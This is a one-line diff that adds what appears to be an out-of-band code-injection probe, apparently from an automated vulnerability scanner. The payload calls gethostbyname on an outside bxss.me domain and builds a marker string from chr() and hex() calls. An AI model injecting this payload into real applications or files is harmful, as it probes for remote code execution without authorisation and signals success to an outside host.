@@ -1,0 +1,1 @@
+gethostbyname(lc('hityg'.'hohulxrmcd52c.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(106).chr(77).chr(97).chr(71)
